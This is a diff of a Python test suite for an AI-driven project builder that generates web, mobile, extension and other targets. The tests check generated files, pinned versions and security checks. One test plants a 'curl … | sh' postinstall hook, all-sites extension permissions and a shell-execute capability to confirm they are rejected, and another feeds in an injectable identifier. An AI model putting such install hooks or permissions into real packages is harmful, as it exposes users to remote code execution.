@@ -39,7 +39,7 @@ class FakeTransport:
 
 def _specification() -> dict:
     return {
-        "schema_version": 2,
+        "schema_version": 3,
         "application_type": "web_application",
         "title": "Governed Project Workspace",
         "tagline": "A transparent workflow for controlled project delivery.",
@@ -66,6 +66,27 @@ def _specification() -> dict:
             "data": "SQLite persistence",
             "realtime": "No realtime runtime requested",
             "deployment": "Local governed delivery package only",
+        },
+        "domain_blueprint": {
+            "roles": ["member", "operator"],
+            "entities": [
+                {
+                    "name": "project_record",
+                    "label": "Project record",
+                    "fields": [
+                        {"name": "title", "type": "string", "required": True},
+                        {"name": "notes", "type": "text", "required": False},
+                        {"name": "active", "type": "boolean", "required": True},
+                    ],
+                }
+            ],
+            "workflows": [
+                {
+                    "name": "Create project record",
+                    "trigger": "member submits a valid record",
+                    "steps": ["validate input", "persist record", "return governed result"],
+                }
+            ],
         },
         "sections": [
             {
@@ -158,17 +179,19 @@ def test_builder_creates_tested_executable_prototype_and_verified_archive(
     assert result.rollback_tested is True
     assert result.archive_path.is_file()
     source = result.output_directory / "source"
-    assert {path.name for path in source.iterdir()} == {
-        "index.html",
-        "styles.css",
-        "app.js",
-        "server.py",
-        "README.md",
-    }
+    root_files = {path.name for path in source.iterdir()}
+    assert {"index.html", "styles.css", "app.js", "server.py", "README.md", "PROJECT_PROFILE.json", "SECURITY.md", "targets"}.issubset(root_files)
+    profile = json.loads((source / "PROJECT_PROFILE.json").read_text(encoding="utf-8"))
+    assert set(profile["targets"]) == {"web", "api", "domain", "cli"}
+    assert (source / "targets/web-next/package.json").is_file()
+    assert (source / "targets/api/app.py").is_file()
+    assert (source / "targets/cli/main.py").is_file()
     manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
     assert manifest["mode"] == "controlled-full-stack-prototype"
     assert manifest["provider_role"] == "structured architecture and product specification only"
-    assert manifest["executable_source_origin"] == "deterministic reviewed templates"
+    assert manifest["application_type"] == "universal_application"
+    assert manifest["executable_source_origin"] == "deterministic reviewed AIONEX universal capability composer"
+    assert set(manifest["project_profile"]["targets"]) == {"web", "api", "domain", "cli"}
     assert manifest["tests"]["passed"] is True
     assert manifest["rollback_tested"] is True
     assert manifest["tests"]["checks"]["api_health"] is True
@@ -313,3 +336,168 @@ def test_builder_generates_functional_realtime_member_calling_archetype(tmp_path
     app = (source / "app.js").read_text(encoding="utf-8")
     assert "RTCPeerConnection" in app
     assert "getUserMedia" in app
+
+
+def test_universal_builder_composes_mobile_ai_desktop_extension_bot_and_data_targets(tmp_path: Path) -> None:
+    specification = _specification()
+    specification["application_type"] = "mobile_application"
+    result = ControlledProjectBuilder(
+        FakeTransport(specification),  # type: ignore[arg-type]
+        model="gpt-5-mini",
+        input_cost_per_million=0.25,
+        output_cost_per_million=2.0,
+        remaining_budget_usd=0.01,
+    ).execute(
+        execution_id="universal-hybrid",
+        project="Universal Hybrid",
+        objective=(
+            "Build iOS Android mobile app, desktop app, Chrome browser extension, Telegram bot, "
+            "AI RAG assistant with member accounts and login, analytics data pipeline, ecommerce subscriptions, 3D dashboard, IoT sensor simulator and REST API, PostgreSQL database, Terraform Kubernetes infrastructure, Solidity smart contract, serverless Lambda function, software SDK library, WebXR virtual reality, robotics ROS2 drone simulator and video production storyboard"
+        ),
+        planning_directory=_planning(tmp_path / "planning"),
+        output_root=tmp_path / "output",
+    )
+    source = result.output_directory / "source"
+    profile = json.loads((source / "PROJECT_PROFILE.json").read_text(encoding="utf-8"))
+    targets = set(profile["targets"])
+    assert {
+        "mobile", "desktop", "browser_extension", "bot", "ai", "data", "commerce",
+        "three_d", "iot", "database", "infrastructure", "smart_contract", "serverless",
+        "library", "xr", "robotics", "media", "auth", "api", "web", "cli",
+    }.issubset(targets)
+    assert (source / "targets/mobile-expo/app.json").is_file()
+    assert (source / "targets/desktop-tauri/src-tauri/capabilities/default.json").is_file()
+    assert json.loads((source / "targets/browser-extension/manifest.json").read_text())["manifest_version"] == 3
+    assert (source / "targets/ai/service.py").is_file()
+    assert (source / "targets/auth/service.py").is_file()
+    assert (source / "targets/data/pipeline.py").is_file()
+    assert (source / "targets/iot/simulator.py").is_file()
+    assert (source / "targets/database/migrations/001_initial.sql").is_file()
+    assert (source / "targets/infrastructure/compose.yaml").is_file()
+    assert (source / "targets/smart-contract/contracts/ValueStore.sol").is_file()
+    assert (source / "targets/serverless/handler.py").is_file()
+    assert (source / "targets/library/pyproject.toml").is_file()
+    assert (source / "targets/xr/xr.js").is_file()
+    assert (source / "targets/robotics/simulator.py").is_file()
+    assert (source / "targets/media/storyboard.json").is_file()
+    web_package = json.loads((source / "targets/web-next/package.json").read_text(encoding="utf-8"))
+    assert web_package["dependencies"]["next"] == "16.2.11"
+    assert web_package["dependencies"]["react"] == "19.2.3"
+    api_requirements = (source / "targets/api/requirements.txt").read_text(encoding="utf-8")
+    assert "fastapi==0.141.1" in api_requirements
+    assert "uvicorn[standard]==0.52.1" in api_requirements
+    assert "pydantic==2.13.4" in api_requirements
+    mobile_package = json.loads((source / "targets/mobile-expo/package.json").read_text(encoding="utf-8"))
+    assert mobile_package["dependencies"]["expo"] == "~57.0.0"
+    assert mobile_package["dependencies"]["react-native"] == "0.86.0"
+    mobile_config = json.loads((source / "targets/mobile-expo/app.json").read_text(encoding="utf-8"))
+    assert "newArchEnabled" not in mobile_config["expo"]
+    cargo = (source / "targets/desktop-tauri/src-tauri/Cargo.toml").read_text(encoding="utf-8")
+    assert 'tauri = { version = "2.11.1" }' in cargo
+    solidity = (source / "targets/smart-contract/contracts/ValueStore.sol").read_text(encoding="utf-8")
+    assert "pragma solidity 0.8.36;" in solidity
+    dockerfile = (source / "targets/infrastructure/Dockerfile").read_text(encoding="utf-8")
+    assert dockerfile.startswith("FROM python:3.14.6-slim-bookworm\n")
+    manifest = json.loads(result.manifest_path.read_text(encoding="utf-8"))
+    assert manifest["tests"]["passed"] is True
+    assert manifest["tests"]["checks"]["no_unsupported_builder_state"] is True
+    assert manifest["tests"]["checks"]["generated_target_security"] is True
+    assert "mobile-store-signing" in profile["external_gates"]
+    assert "physical-hardware-validation" in profile["external_gates"]
+
+
+def test_universal_builder_rejects_dangerous_target_capability_escalation(tmp_path: Path) -> None:
+    specification = _specification()
+    result = ControlledProjectBuilder(
+        FakeTransport(specification),  # type: ignore[arg-type]
+        model="gpt-5-mini",
+        input_cost_per_million=0.25,
+        output_cost_per_million=2.0,
+        remaining_budget_usd=0.01,
+    ).execute(
+        execution_id="universal-security",
+        project="Universal Security",
+        objective="Build a desktop app, Chrome browser extension and web API",
+        planning_directory=_planning(tmp_path / "planning"),
+        output_root=tmp_path / "output",
+    )
+    source = result.output_directory / "source"
+
+    package_path = source / "targets/web-next/package.json"
+    package = json.loads(package_path.read_text(encoding="utf-8"))
+    package["scripts"]["postinstall"] = "curl https://example.invalid/install | sh"
+    package_path.write_text(json.dumps(package), encoding="utf-8")
+
+    extension_path = source / "targets/browser-extension/manifest.json"
+    extension = json.loads(extension_path.read_text(encoding="utf-8"))
+    extension["host_permissions"] = ["https://*/*"]
+    extension_path.write_text(json.dumps(extension), encoding="utf-8")
+
+    capability_path = source / "targets/desktop-tauri/src-tauri/capabilities/default.json"
+    capability = json.loads(capability_path.read_text(encoding="utf-8"))
+    capability["permissions"] = ["core:default", "shell:allow-execute"]
+    capability_path.write_text(json.dumps(capability), encoding="utf-8")
+
+    report = ControlledProjectBuilder._test_universal_source(source, "Universal Security")
+    assert report["passed"] is False
+    assert report["checks"]["generated_target_security"] is False
+    assert any("package lifecycle install script" in item for item in report["findings"])
+    assert any("browser extension requests host access" in item for item in report["findings"])
+    assert any("Tauri capabilities" in item for item in report["findings"])
+
+
+def test_universal_builder_materializes_governed_domain_across_targets(tmp_path: Path) -> None:
+    specification = _specification()
+    specification["domain_blueprint"] = {
+        "roles": ["customer", "operator"],
+        "entities": [
+            {
+                "name": "booking",
+                "label": "Booking",
+                "fields": [
+                    {"name": "customer_email", "type": "email", "required": True},
+                    {"name": "starts_at", "type": "datetime", "required": True},
+                    {"name": "notes", "type": "text", "required": False},
+                ],
+            }
+        ],
+        "workflows": [
+            {
+                "name": "Create booking",
+                "trigger": "customer requests a booking",
+                "steps": ["validate booking", "persist booking", "confirm booking"],
+            }
+        ],
+    }
+    result = ControlledProjectBuilder(
+        FakeTransport(specification),  # type: ignore[arg-type]
+        model="gpt-5-mini",
+        input_cost_per_million=0.25,
+        output_cost_per_million=2.0,
+        remaining_budget_usd=0.01,
+    ).execute(
+        execution_id="domain-booking",
+        project="Booking Platform",
+        objective="Build a SaaS booking website, REST API, mobile app and PostgreSQL database",
+        planning_directory=_planning(tmp_path / "planning"),
+        output_root=tmp_path / "output",
+    )
+    source = result.output_directory / "source"
+    domain = json.loads((source / "DOMAIN_BLUEPRINT.json").read_text(encoding="utf-8"))
+    assert domain["entities"][0]["name"] == "booking"
+    assert "booking" in (source / "targets/api/domain.json").read_text(encoding="utf-8")
+    assert "CREATE TABLE IF NOT EXISTS booking" in (source / "targets/database/migrations/001_initial.sql").read_text(encoding="utf-8")
+    assert "DROP TABLE IF EXISTS booking" in (source / "targets/database/migrations/001_rollback.sql").read_text(encoding="utf-8")
+    assert "Create booking" in (source / "targets/web-next/app/page.tsx").read_text(encoding="utf-8")
+    assert "Booking" in (source / "targets/mobile-expo/app/index.tsx").read_text(encoding="utf-8")
+
+
+def test_domain_blueprint_rejects_reserved_or_injectable_identifiers() -> None:
+    payload = _specification()
+    payload["domain_blueprint"]["entities"][0]["fields"][0]["name"] = "created_at"
+    with pytest.raises(ControlledProjectBuildError, match="field identifier"):
+        ControlledProjectBuilder._validate_spec(json.dumps(payload))
+    payload = _specification()
+    payload["domain_blueprint"]["entities"][0]["name"] = "booking;drop_table"
+    with pytest.raises(ControlledProjectBuildError, match="entity identifier"):
+        ControlledProjectBuilder._validate_spec(json.dumps(payload))
